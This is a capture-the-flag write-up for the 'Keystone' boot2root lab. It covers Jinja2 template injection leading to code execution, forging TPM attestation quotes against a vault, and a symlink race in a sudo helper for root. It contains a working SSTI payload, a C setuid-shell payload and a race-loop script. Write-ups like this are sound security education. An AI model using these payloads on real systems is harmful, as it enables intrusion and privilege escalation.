---
title: "Keystone — Attestation Portal (boot2root)"
description: "Attack chain:** Jinja2 SSTI (RCE as webapp) → forged TPM attestation against the internal vault (VAULT-114) → leaked tpm-admin SSH key → TOCTOU symlink race in the measure-and-run sudo…"
event: "isfcr"
category: "boot2root"
categoryLabel: "Boot2Root"
tags: ["ISFCR CTF 2026","boot2root"]
date: "2026-10-10"
teammate: false
source: "isfcr/writeups/keystone-user-and-root.md"
---

**Target:** `10.48.140.14`

## Result

| Flag | Value |
|------|-------|
| user.txt | `isfcr{tr0st_but_v3rify_the_endors3ment}` |
| root.txt | `isfcr{a_pcr_is_a_promise_not_proof}` |

**Attack chain:** Jinja2 SSTI (RCE as `webapp`) → forged TPM attestation against
the internal vault (VAULT-114) → leaked `tpm-admin` SSH key → TOCTOU symlink
race in the `measure-and-run` sudo helper → setuid root shell.

---

## 1. Reconnaissance

Full TCP scan:

```
$ nmap -sC -sV -T4 -p- 10.48.140.14
22/tcp   open  ssh       OpenSSH 9.2p1 Debian 2+deb12u10
80/tcp   open  http      nginx 1.22.1   (title: "Keystone — Attestation Portal")
```

Only SSH and an nginx-served web portal are exposed.

## 2. Web enumeration

`GET /` reveals a **Keystone attestation portal** (Flask app):

- `/review?doc=...` renders the documented "review surface"
- mentions an internal vault at `127.0.0.1:9000` and a swtpm socket on `127.0.0.1:2321`
- `/opt/vault/main.go`, `/etc/keystone/README.md`, `/etc/measure/allowed-hashes.txt` are referenced

The docs pages leak the big picture:

- Vault protocol: `POST /attest` → `POST /verify` → `GET /secret?token=`
- Changelog: *"added Jinja2 render on /review. Risk accepted — docs are trusted."*
- Operators: `measure-and-run` is sudo-approved, extends PCR 23, allowlist at
  `/etc/measure/allowed-hashes.txt`
- Deprecation page documents the ancient HMAC flow (just lore)

## 3. First foothold — Jinja2 SSTI → RCE

`/review?doc=` passes user input into `render_template_string()`, so the doc name
is evaluated as a Jinja2 template:

```
$ curl -sk --data-urlencode 'doc={{7*7}}' -G http://10.48.140.14/review
... Requested: 49 ...
```

Command execution (short payload):

```
{{lipsum.__globals__.os.popen('CMD').read()}}
```

Result: RCE as `webapp` (`uid=1001`, also member of group `tpm`).

> **Gotcha:** the rendered `doc` value is used as a *filename* (`DOCS_DIR / f"{doc}.md"`
> → `resolve()` → **ENAMETOOLONG** → HTTP 500) when it exceeds ~255 bytes. Any payload
> that is long, or whose *output* is long, must stay short. File upload was performed
> by base64-encoding the script and appending it to `/tmp` in small chunks (`printf %s <chunk> >> /tmp/x.b64`)
> using only the short `lipsum` payload.

Webapp source (`/opt/webapp/portal.py`) confirms the vulnerability is intentional.

## 4. The vault — forged attestation (VAULT-114)

Reading `/opt/vault/main.go` shows the attestation flow and the deliberate bug:

1. `POST /attest {"ak_pub_pem":"..."}` pins **any** RSA public key and returns
   `session`, `nonce`, and `expected_pcrs` / `expected_digest`.
2. `POST /verify` checks:
   - signature over `quote_msg` verifies against the **client-supplied** AK
   - `magic == 0xFF544347`, `type == 0x8018` (QUOTE)
   - `extraData == nonce`
   - `pcrDigest == expected_digest` (SHA256 of three zero PCRs)
3. **Missing credential activation** (`tpm2_makecredential`/`ActivateCredential`) —
   the AK is never bound to the TPM's EK. Any forged key/quotes are accepted.

Exploit (run on the box as `webapp`):

- generate RSA-2048 key, `POST /attest` with PEM pub
- craft a binary `TPMS_ATTEST`:
  - magic `0xFF544347`, type `0x8018`, empty qualifiedSigner
  - `extraData` = server nonce, 17-byte clock info, 8-byte firmware
  - PCR selection `{hashAlg=0x000B, sizeofSelect=1, select=0x01}`
  - `pcrDigest` = the server's `expected_digest`
- sign it PKCS#1 v1.5 / SHA-256, `POST /verify`
- `GET /secret?token=...` returns the sealed payload

The sealed payload contained **an OpenSSH private key for `tpm-admin`**:

```
# ---------------- BEGIN tpm-admin SSH KEY ----------------
-----BEGIN OPENSSH PRIVATE KEY----- ...
```

## 5. User flag

SSH in with the leaked key:

```
$ ssh -i tpm-admin.key tpm-admin@10.48.140.14
$ cat /home/tpm-admin/user.txt
isfcr{tr0st_but_v3rify_the_endors3ment}
```

Also enumerated: `tpm-admin` may run as root (NOPASSWD):

```
(root) NOPASSWD: /usr/sbin/measure-and-run *
```

Home dir contains a `race/` folder with `safe` (a copy of `/bin/true`), `evil`
(a script), and `link -> evil` — a hint at a symlink TOCTOU.

## 6. Root — TOCTOU race in `measure-and-run`

Reverse-engineering `/usr/sbin/measure-and-run` (not stripped):

1. `open(argv[1])` → `fstat`, `mmap`, SHA-256, `close`
2. `system("tpm2_pcrextend 23:sha256=<digest>")`
3. parse `/etc/measure/allowed-hashes.txt`, `strcmp` the digest
4. on match:
   - print `policy ok, launching...`
   - **`usleep(20000)`** ← 20 ms race window
   - `open(argv[1])` **again**
   - `fexecve(fd, argv+1, env)` as **root**

It hashes the *path*, sleeps, then re-opens the *same path* and executes it —
classic TOCTOU. If `argv[1]` is a symlink, flipping it between a hashed-safe
target (like the `safe` copy of `/bin/true`) and our payload between the two
`open()` calls wins.

Two important details:

- **`fexecve` rejects scripts** (ENOENT) — the payload must be an ELF.
  `evil` (a bash script that `cp /bin/bash /tmp/rootbash; chmod 4755`)
  was recompiled from a tiny C program.
- The `race/` directory is owned by `tpm-admin`, so the symlink is ours to flip.

Payload and race loop:

```c
#include <unistd.h>
int main(){ setuid(0); setgid(0);
  execl("/bin/sh","sh","-c",
        "cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; echo PWNED",
        (char*)0); return 0; }
```

```bash
cd ~/race
rm -f /tmp/rootbash
( while :; do ln -sfn safe link; ln -sfn evil link; done 2>/dev/null ) &
for i in $(seq 1 800); do
  r=$(sudo -n /usr/sbin/measure-and-run /home/tpm-admin/race/link 2>&1)
  case "$r" in *PWNED*) echo "hit at $i"; break;; esac
done
```

Won on iteration 6 (A symlink flip landing inside the 20 ms `usleep` window):

```
-rwsr-xr-x 1 root root 1265648 /tmp/rootbash
```

## 7. Root flag

```
$ /tmp/rootbash -p -c 'id; cat /root/root.txt'
uid=1003(tpm-admin) gid=1003(tpm-admin) euid=0(root) ...
isfcr{a_pcr_is_a_promise_not_proof}
```

---

## Summary of vulnerabilities

| # | Component | Vulnerability |
|---|-----------|---------------|
| 1 | Flask portal `/review?doc=` | Jinja2 SSTI → RCE as `webapp` |
| 2 | Vault `127.0.0.1:9000` | Missing credential activation (VAULT-114) → forged attestation allowed, secrets leak |
| 3 | `/usr/sbin/measure-and-run` (sudo) | TOCTOU: hash path, sleep 20 ms, re-open path → symlink swap executes attacker ELF as root |
